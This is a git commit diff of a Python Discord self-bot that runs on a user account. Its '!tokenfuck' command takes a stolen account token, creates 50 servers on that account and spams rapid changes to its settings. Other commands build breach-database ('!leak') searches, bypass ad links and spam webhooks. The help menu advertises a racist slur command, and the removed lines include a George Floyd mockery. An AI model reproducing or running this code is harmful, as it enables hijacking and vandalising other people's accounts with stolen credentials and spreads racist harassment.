03a43ea4f19a2136397fcef3e6f15a332623b2f4
xmas xyte <89664166+3uf@users.noreply.github.com>
2021-12-26 00:29:08 +0100

    Update main.py

--- main.py
+++ main.py
@@ -5,16 +5,14 @@ import aiohttp
 import requests
 import asyncio
 import json
-import datetime
+from datetime import datetime
 import base64
-from googletrans import Translator
+import keep_alive
 from itertools import cycle
-
+import io
 
 token = ""
 
-
-translator = Translator()
 
 bot = commands.Bot(command_prefix='!', self_bot=True)
 
@@ -77,16 +75,13 @@ locales = [
 
 @bot.event
 async def on_message_delete(message):
-
     global snipe_message_content
     global snipe_message_author
     global snipe_message_id
-
     snipe_message_content = message.content
     snipe_message_author = message.author.id
     snipe_message_id = message.id
     await asyncio.sleep(60)
-
     if message.id == snipe_message_id:
         snipe_message_author = None
         snipe_message_content = None
@@ -97,16 +92,15 @@ async def on_message_delete(message):
 
 @bot.event
 async def on_message(message):
-
         if message.content == '!help':
           embed = discord.Embed(title='List', color = color, description=f"""
-**!test** - checks to see if the bot is running
 
 **!snipe** - sends the last deleted message 
-**!translate** - translates text to english 
 **!b64encode/decode** - encodes/decodes something in base64 
 **!botinvite** - sends a invite to a bot
+**!linkvertise** - bypasses a linkvertise link
 
+**!leak** - checks a query on intelx (only emails,)
 **!idinfo** - checks an id
 **!ipinfo** - checks an ip 
 **!tokeninfo** - checks a tokens info 
@@ -120,7 +114,9 @@ async def on_message(message):
 **!racc** - sends a raccoon pic 
 **!cat** - sends a cat pic 
 **!dog** - sends a dog pic 
+**!hentai** - you already know what it does
 
+**!poll** - creates a poll
 **!guessinggame** - guessing game (if someone interrupts it breaks)
 **!nigrate** - sends ur nigrate u blackie 
 
@@ -128,24 +124,43 @@ async def on_message(message):
           embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/887809991971581962/898693499787046922/cat-kissing.gif")
           await message.channel.send(embed=embed)
 
-        elif message.content == "4ren":
-          await message.channel.send("u mean the retard monkey :clown: :clown: :clown:")
-
-        elif message.content == "floyd":
-          await message.channel.send("i cant breathe")
-          await message.channel.send("https://i.imgur.com/mn3EslL.png")
 
         elif message.content == "!poll":
           await message.channel.send("Question?")
           response = await bot.wait_for('message')
           question = response.content
-          embed = discord.Embed(title='Poll!', color = color, description=f"Poll: {question}")
-          message = await message.channel.send(embed=embed)
-          await message.add_reaction('✅')
-          await message.add_reaction('❎')
+          if question == "!poll":
+            return
+          else:
+            embed = discord.Embed(title='Poll!', color = color, description=f"{question}")
+            message = await message.channel.send(embed=embed)
+            await message.add_reaction('✅')
+            await message.add_reaction('❎')
 
-        elif message.content == "!test":
-          await message.channel.send("bot is working!")
+        elif message.content == "!leak":
+          await message.channel.send("Query?")
+          query = await bot.wait_for('message')
+          if query.author.id == bot.user.id:
+            pass
+          else:
+            search = query.content
+            search2 = search.replace("@", "%40")
+            await message.channel.send(f"<https://intelx.io/?s={search2}>")
+          
+        elif message.content == "!hentai":
+          r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
+          res = r.json()
+          try:
+              async with aiohttp.ClientSession() as session:
+                  async with session.get(res['url']) as resp:
+                      image = await resp.read()
+              with io.BytesIO(image) as file:
+                  await message.channel.send(file=discord.File(file, f"exeter_hentai.gif"))
+          except:
+              em = discord.Embed()
+              em.set_image(url=res['url'])
+              await message.channel.send(embed=em)
+
 
         elif message.content == "!botinvite":
           await message.channel.send('Bot id? ')
@@ -190,8 +205,6 @@ async def on_message(message):
           await message.channel.send(embed=embed)
           return
 
-
-
         elif message.content == "!dog":
              async with aiohttp.ClientSession() as session:
               request = await session.get('https://some-random-api.ml/img/dog') 
@@ -201,65 +214,128 @@ async def on_message(message):
               await message.channel.send(embed=embed)
 
         elif message.content == '!tokenfuck':
+          languages = {
+              'da'    : 'Danish, Denmark',
+              'de'    : 'German, Germany',
+              'en-GB' : 'English, United Kingdom',
+              'en-US' : 'English, United States',
+              'es-ES' : 'Spanish, Spain',
+              'fr'    : 'French, France',
+              'hr'    : 'Croatian, Croatia',
+              'lt'    : 'Lithuanian, Lithuania',
+              'hu'    : 'Hungarian, Hungary',
+              'nl'    : 'Dutch, Netherlands',
+              'no'    : 'Norwegian, Norway',
+              'pl'    : 'Polish, Poland',
+              'pt-BR' : 'Portuguese, Brazilian, Brazil',
+              'ro'    : 'Romanian, Romania',
+              'fi'    : 'Finnish, Finland',
+              'sv-SE' : 'Swedish, Sweden',
+              'vi'    : 'Vietnamese, Vietnam',
+              'tr'    : 'Turkish, Turkey',
+              'cs'    : 'Czech, Czechia, Czech Republic',
+              'el'    : 'Greek, Greece',
+              'bg'    : 'Bulgarian, Bulgaria',
+              'ru'    : 'Russian, Russia',
+              'uk'    : 'Ukranian, Ukraine',
+              'th'    : 'Thai, Thailand',
+              'zh-CN' : 'Chinese, China',
+              'ja'    : 'Japanese',
+              'zh-TW' : 'Chinese, Taiwan',
+              'ko'    : 'Korean, Korea'
+          }
+
+          cc_digits = {
+              'american express': '3',
+              'visa': '4',
+              'mastercard': '5'
+          }
+
+          locales = [
+              "da", "de",
+              "en-GB", "en-US",
+              "es-ES", "fr",
+              "hr", "it",
+              "lt", "hu",
+              "nl", "no",
+              "pl", "pt-BR",
+              "ro", "fi",
+              "sv-SE", "vi",
+              "tr", "cs",
+              "el", "bg",
+              "ru", "uk",
+              "th", "zh-CN",
+              "ja", "zh-TW",
+              "ko"
+          ]
           await message.channel.send("Token?")
           response = await bot.wait_for('message')
-          _token = str(response.content)
-          await message.channel.send("Server names?")
-          response2 = await bot.wait_for('message')
-          names = str(response2.content)
-          headers = {
-              'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-              'Content-Type': 'application/json',
-              'Authorization': _token,
-          }
-          request = requests.Session()
-          payload = {
-              'theme': "light",
-              'locale': "ja",
-              'message_display_compact': False,
-              'inline_embed_media': False,
-              'inline_attachment_media': False,
-              'gif_auto_play': False,
-              'render_embeds': False,
-              'render_reactions': False,
-              'animate_emoji': False,
-              'convert_emoticons': False,
-              'enable_tts_command': False,
-              'explicit_content_filter': '0',
-              'status': "invisible",
-              'developer_mode': True
-              
-          }
-          guild = {
-              'channels': None,
-              'icon': None,
-              'name': names,
-              'region': "europe"
-          } 
-          for _i in range(50):
-              requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
-          while True:
-              try:
-                  request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
-              except Exception as e:
-                  pass
-              else:
-                  break
-          modes = cycle(["light", "dark"])
-          statuses = cycle(["online", "idle", "dnd", "invisible"])
-          for i in range(100):
-              setting = {
-                  'theme': next(modes),
-                  'locale': random.choice(locales),
-                  'status': next(statuses)
+          if response.author.id == bot.user.id:
+            pass
+          else:
+            _token = str(response.content)
+            await message.channel.send("Server names?")
+            response2 = await bot.wait_for('message')
+            if response2.author.id == bot.user.id:
+              pass
+            else:
+              names = str(response2.content)
+              headers = {
+                  'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+                  'Content-Type': 'application/json',
+                  'Authorization': _token,
               }
-              for i in range(100):
+              request = requests.Session()
+              payload = {
+                  'theme': "light",
+                  'locale': "ja",
+                  'message_display_compact': False,
+                  'inline_embed_media': False,
+                  'inline_attachment_media': False,
+                  'gif_auto_play': False,
+                  'render_embeds': False,
+                  'render_reactions': False,
+                  'animate_emoji': False,
+                  'convert_emoticons': False,
+                  'enable_tts_command': False,
+                  'explicit_content_filter': '0',
+                  'status': "invisible",
+                  'developer_mode': True
+                  
+              }
+              guild = {
+                  'channels': None,
+                  'icon': None,
+                  'name': names,
+                  'region': "europe"
+              } 
+              try:
+                for _i in range(50):
+                    requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
+              except:
+                pass
+              while True:
                   try:
-                      request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
-                  except Exception as e:
+                      request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
+                  except KeyError:
                       pass
                   else:
                       break
+              modes = cycle(["light", "dark"])
+              statuses = cycle(["online", "idle", "dnd", "invisible"])
+              for i in range(100):
+                  setting = {
+                      'theme': next(modes),
+                      'locale': random.choice(locales),
+                      'status': next(statuses)
+                  }
+                  for i in range(100):
+                      try:
+                          request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
+                      except KeyError:
+                          pass
+                      else:
+                          break
 
         elif message.content == "!spamwebhook":
           await message.channel.send("Webhook? ")
@@ -298,24 +374,6 @@ async def on_message(message):
               embed = discord.Embed(title="<3", color=color)
               embed.set_image(url=dogjson['link'])
               await message.channel.send(embed=embed)
-
-
-
-
-        elif message.content == "!translate":
-          try:
-            await message.channel.send("Message? (It automatically detects the language of your message!)")
-            content = await bot.wait_for('message')
-            contenttxt = str(content.content)     
-            translated = translator.translate(contenttxt)
-            await message.channel.send(translated.text)
-          except:
-            pass
-
-
-
-
-
 
 
 
@@ -402,17 +460,30 @@ async def on_message(message):
           embed.set_thumbnail(url=user.avatar_url)
           await message.channel.send(embed=embed)
 
+        elif message.content == "!linkvertise":
+          headers = {
+          "Host": "bypass.bot.nu",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+          "Accept": "*/*",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Accept-Encoding": "gzip, deflate, br",
+          "Referer": "https://bypass.bot.nu/",
+          "Connection": "keep-alive",
+              }
+          await message.channel.send("Link?")
+          response = await bot.wait_for('message')
+          link = response.content
+          data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
+          link = data.json()["destination"]
+          await message.channel.send(f"Link: {link}")
 
         elif message.content == "!av":
           await message.channel.send('User?')
           try:
             response = await bot.wait_for('message')
             response2 = response.content
-            user2 = response2.strip('<')
-            user3 = user2.strip('>')
-            user4 = user3.strip('@')
-            user5 = user4.strip('!')
-            user = await bot.fetch_user(user5)
+            user2 = response2.strip('<').strip('>').strip('@').strip('!')
+            user = await bot.fetch_user(user2)
             await message.channel.send(user.avatar_url)
           except:
             response = await bot.wait_for('message')
@@ -420,15 +491,16 @@ async def on_message(message):
             user = await bot.fetch_user(response2)
             await message.channel.send(user.avatar_url)
 
+
+
+
+
         elif message.content == "!banner":
           await message.channel.send('User?')
           response = await bot.wait_for('message')
           response2 = response.content
-          user2 = response2.strip('<')
-          user3 = user2.strip('>')
-          user4 = user3.strip('@')
-          user5 = user4.strip('!')
-          user = await bot.fetch_user(user5)
+          user2 = response2.strip('<').strip('>').strip('@').strip('!')
+          user = await bot.fetch_user(user2)
           req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
           banner_id = req["banner"]
           if banner_id == None:
@@ -449,11 +521,9 @@ async def on_message(message):
 
               ipjson = await request.json()
               json_formatted_str = json.dumps(ipjson, indent=2)
-              ipinfo2 = json_formatted_str.replace(":", "")
-              ipinfo3 = ipinfo2.replace('"', "")
-              ipinfo4 = ipinfo3.replace('{', "")
-              ipinfo5 = ipinfo4.replace('}', "")
-              await message.channel.send(f"""```{ipinfo5}```""")
+              ipinfo = json_formatted_str.strip('{').strip('}').replace('"', "⁣").replace(',', '⁣').replace('  ⁣', '⁣')
+
+              await message.channel.send(f"""```{ipinfo}```""")
               
 
         elif message.content == '!snipe':
@@ -486,8 +556,5 @@ async def on_message(message):
 
 
 
-
-
-
-
+       
 bot.run(token)
